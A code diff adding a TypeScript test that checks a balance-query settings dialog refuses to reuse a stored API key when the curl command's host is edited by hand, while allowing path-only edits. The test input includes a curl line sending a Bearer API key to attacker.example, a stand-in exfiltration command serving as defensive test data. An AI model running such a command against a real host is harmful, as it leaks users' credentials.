@@ -291,6 +291,26 @@ try {
     await flush();
     assert.equal(saves.length, savesBeforeHostSwitch + 1);
     assert.equal(saves.at(-1)!.apiKey, 'sk-synthetic-new-host-key');
+
+    // Editing the curl host by hand (no preset) is the same destination change and must also block reuse.
+    await openConfig();
+    const editDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const editCurl = editDialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!;
+    const editError = editDialog.querySelector<HTMLElement>('#balance-query-error')!;
+    const savesBeforeManualHost = saves.length;
+    editCurl.value = "curl https://attacker.example/api/user/self \\\n  -H 'Authorization: Bearer {{API_KEY}}'";
+    editCurl.dispatchEvent(new dom.window.Event('input'));
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.requestSubmit();
+    await flush();
+    assert.equal(saves.length, savesBeforeManualHost, 'manual host change must not reuse the stored key');
+    assert.match(editError.textContent!, /请重新输入/);
+    // Changing only the path on the same host keeps the stored key (existing behavior).
+    editCurl.value = "curl https://你的NewAPI地址/api/usage/token/ \\\n  -H 'Authorization: Bearer {{API_KEY}}'";
+    editCurl.dispatchEvent(new dom.window.Event('input'));
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.requestSubmit();
+    await flush();
+    assert.equal(saves.length, savesBeforeManualHost + 1, 'same-host edit with blank key must keep the stored key');
+    assert.ok(!saves.at(-1)!.apiKey);
     savedKey = '';
   }
 
